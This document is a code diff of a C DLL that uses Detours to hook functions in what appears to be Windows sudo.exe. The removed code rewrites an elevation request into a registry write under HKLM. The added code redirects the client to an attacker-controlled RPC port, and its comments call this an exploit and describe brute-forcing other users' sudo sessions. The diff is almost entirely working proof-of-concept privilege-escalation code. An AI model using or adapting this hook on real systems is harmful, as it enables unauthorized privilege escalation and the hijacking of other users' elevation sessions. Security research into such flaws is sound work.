@@ -8,80 +8,21 @@ struct rust_str {
     BYTE* data;
 };
 
-rust_str *copy_rust_str(rust_str *src) {
-    rust_str* out = (rust_str*)malloc(sizeof(rust_str));
-    if (out == NULL) {
-        return NULL;
-    }
-    out->length = src->length;
-    out->data = (BYTE *)malloc(out->length);
-    if (out->data == NULL) {
-        return NULL;
-    }
-    memcpy(out->data, src->data, out->length);
-    return out;
-}
+const DWORD kClientDoElevationRequestOffset = 0x8ea50;
+const DWORD kSetupClientOffset = 0x8e770;
 
-static rust_str* rust_str_from_char(const char input[]) {
-    rust_str* new_str = (rust_str *)malloc(sizeof(rust_str));
-    if (new_str == NULL) {
-        return NULL;
-    }
-    new_str->length = strlen(input);
-    new_str->data = (BYTE*)malloc(new_str->length);
-    if (new_str->data == NULL) {
-        return NULL;
-    }
-    memcpy(new_str->data, input, new_str->length);
-    return new_str;
-}
-
-typedef int(__fastcall*func_t)(handle_t, HANDLE, HANDLE, HANDLE, int, rust_str *, rust_str *, rust_str *, rust_str *, GUID *, HANDLE *);
+typedef unsigned long long (__fastcall*func_t)(const char *);
 // Forward declaration of the original function
-int(__fastcall* OriginalDoElevationRequest)(
-    handle_t _hProcHandle,
-    HANDLE p0,
-    HANDLE p1,
-    HANDLE p2,
-    int run_mode,
-    rust_str* cmd,
-    rust_str* args,
-    rust_str* cwd,
-    rust_str* environment,
-    GUID* p8,
-    HANDLE* p9);
+unsigned long long(__fastcall* OriginalSetupClient)(const char *rpc_port_name);
 
 // Hooked function that will be called instead of the original
-int __fastcall HookedDoElevationRequest(
-    handle_t _hProcHandle,
-    HANDLE p0,
-    HANDLE p1,
-    HANDLE p2,
-    int run_mode,
-    rust_str* cmd,
-    rust_str* args,
-    rust_str* cwd,
-    rust_str* environment,
-    GUID* p8,
-    HANDLE* p9) {
-
-    rust_str* o_cmd = copy_rust_str(cmd);
-    rust_str* o_args = copy_rust_str(args);
-
-    rust_str* new_cmd = rust_str_from_char("reg.exe");
-    rust_str* new_args = rust_str_from_char("add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Sudo /v Enabled /t REG_DWORD /d 1337 /f");
-
-    DebugBreak();
-    int my_result = OriginalDoElevationRequest(
-        _hProcHandle, p0, p1, p2, run_mode, new_cmd, new_args, cwd, environment, p8, p9);
-
-    // Call the original function
-    int result = OriginalDoElevationRequest(
-        _hProcHandle, p0, p1, p2, run_mode, cmd, args, cwd, environment, p8, p9);
-
-    // Perform your custom logic after calling the original function
-
-    return result;
+unsigned long long __fastcall HookedSetupClient(char *rpc_port_name) {
+    // Specify an open RPC port.
+    // The easiest way to reproduce this is to use windbg to hold the RPC socket open.
+    // A more robust exploit would brute force this, either by just trying all valid PIDs
+    // for the numbers or by enumerating running sudo.exe processes for other users using createtoolhelp32snapshot
+    OutputDebugStringA("Using controlled sudo RPC socket");
+    return OriginalSetupClient("sudo_elevate_4392");
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
@@ -94,24 +35,24 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
         char* debugOutput = (char*)malloc(256);
         snprintf(debugOutput, 256, "Got Module Handle %p\n", (void*)target_process_handle);
         OutputDebugStringA(debugOutput);
-        OriginalDoElevationRequest = (func_t)((unsigned long long)target_process_handle + 0x8ea50);
-        snprintf(debugOutput, 256, "Attaching the hook to function at %p\n", (void*)OriginalDoElevationRequest);
+        OriginalSetupClient = (func_t)((unsigned long long)target_process_handle + kSetupClientOffset);
+        snprintf(debugOutput, 256, "Attaching the hook to function at %p\n", (void*)OriginalSetupClient);
         OutputDebugStringA(debugOutput);
         DetourRestoreAfterWith();
         DetourTransactionBegin();
         DetourUpdateThread(GetCurrentThread());
-        DetourAttach(&(PVOID&)OriginalDoElevationRequest, HookedDoElevationRequest);
+        DetourAttach(&(PVOID&)OriginalSetupClient, HookedSetupClient);
         DetourTransactionCommit();
-        snprintf(debugOutput, 256, "Hooked function at %p\n", (void*)OriginalDoElevationRequest);
+        snprintf(debugOutput, 256, "Hooked function at %p\n", (void*)HookedSetupClient);
         OutputDebugStringA(debugOutput);
         free(debugOutput);
     }
     else if (dwReason == DLL_PROCESS_DETACH) {
         HMODULE target_process_handle = GetModuleHandle(NULL);
-        OriginalDoElevationRequest = (func_t)GetProcAddress(target_process_handle, "client_DoElevationRequest");
+        OriginalSetupClient = (func_t)GetProcAddress(target_process_handle, "SetupClient");
         DetourTransactionBegin();
         DetourUpdateThread(GetCurrentThread());
-        DetourDetach(&(PVOID&)OriginalDoElevationRequest, HookedDoElevationRequest);
+        DetourDetach(&(PVOID&)OriginalSetupClient, HookedSetupClient);
         DetourTransactionCommit();
     }
     return TRUE;
